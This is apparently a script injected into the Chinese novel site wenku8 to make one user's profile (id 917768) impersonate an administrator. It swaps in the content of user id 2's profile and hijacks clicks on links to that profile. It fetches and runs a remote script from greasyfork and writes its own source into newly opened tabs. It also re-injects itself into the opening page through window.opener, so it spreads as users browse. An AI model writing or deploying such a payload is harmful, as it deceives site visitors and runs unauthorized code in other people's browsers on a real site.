(function __MAIN__() {
    const targetPage1 = 'https://www.wenku8.net/userinfo.php?id=917768';
    const targetPage2 = 'https://www.wenku8.cc/userinfo.php?id=917768';
    const scriptId = 'pretend_admin';
    const imgId = 'pretend_admin_img';
    const scriptLink = 'https://greasyfork.org/scripts/428403/code/script.js';
    //const scriptLink = 'https://pastebin.com/raw/EcHyuzuh';
    const scriptSource = __MAIN__.toString();
    main();

    function main() {
        $('#' + imgId)?.remove();

        switch(location.href) {
            case 'about:blank': {
                console.log('Wenku8 admin: Injecting to opener...');
                // Opened page: Inject to opener
                const oDoc = window.opener.document;
                const script = $(oDoc, scriptId);
                loadJS(script.src, null, null, oDoc);
                break;
            }
            case targetPage1:
            case targetPage2: {
                // Just this page
                console.log('Wenku8 admin: Editing page...');
                getDocument('/userinfo.php?id=2', function (oDoc) {
                    const content = $(document, '#content');
                    const oContent = $(oDoc, '#content');
                    content.innerHTML = oContent.innerHTML;
                });
                break;
            }
            default: {
                // Opener page: Make all opener links magical
                if (window.magical) { return false; }
                console.log('Wenku8 admin: Doing magic...');
                window.magical = true;
                const as = Array.from(document.querySelectorAll('a[href*="/userinfo.php?id=917768"]'))
                    .filter(a => a.pathname === '/userinfo.php' && new URLSearchParams(a.search).get('id') === '917768');
                as.forEach(a => {
                    a.addEventListener('click', function (e) {
                        destroyEvent(e);
                        const newtab = window.open(a.href);
                        const oWin = newtab.window;
                        oWin.addEventListener('load', function(e) {
                            const dom = oWin.document;
                            loadJS(scriptLink, null, err => {
                                const script = dom.createElement('script');
                                script.innerHTML = `(${scriptSource}) ();`;
                                dom.head.appendChild(script);
                            }, dom);
                        });
                    });
                });
            }
        }
        return true;
    }

    // Load javascript from given url
    function loadJS(url, onload, onerror, oDoc = document) {
        onload = onload ?? function() {};
        onload = onload ?? function() {};
        var script = document.createElement('script');
        script.type = 'text/javascript';
        script.addEventListener('load', onload)
        script.addEventListener('error', onerror);
        script.src = url;
        oDoc.head.append(script);
    }

    // Download and parse a url page into a html document(dom).
    // when xhr onload: callback.apply([dom, args])
    function getDocument(url, callback, args = []) {
        const xhr = new XMLHttpRequest();
        xhr.open('GET', url, true);
        xhr.responseType = 'blob';
        xhr.onload = function (response) {
            const htmlblob = xhr.response;
            const reader = new FileReader();
            reader.onload = function (e) {
                const htmlText = reader.result;
                const dom = new DOMParser().parseFromString(htmlText, 'text/html');
                args = [dom].concat(args);
                callback.apply(null, args);
                //callback(dom, htmlText);
            }
            reader.readAsText(htmlblob, 'GBK');
        }
        xhr.send();
    }

    // Just stopPropagation and preventDefault
    function destroyEvent(e) {
        if (!e) {return false;};
        if (!e instanceof Event) {return false;};
        e.stopPropagation();
        e.preventDefault();
    }

    function $() {
        if (arguments.length === 1) {
            return document.querySelector(...arguments);
        } else {
            return arguments[0].querySelector(arguments[1]);
        }
    }
}) ();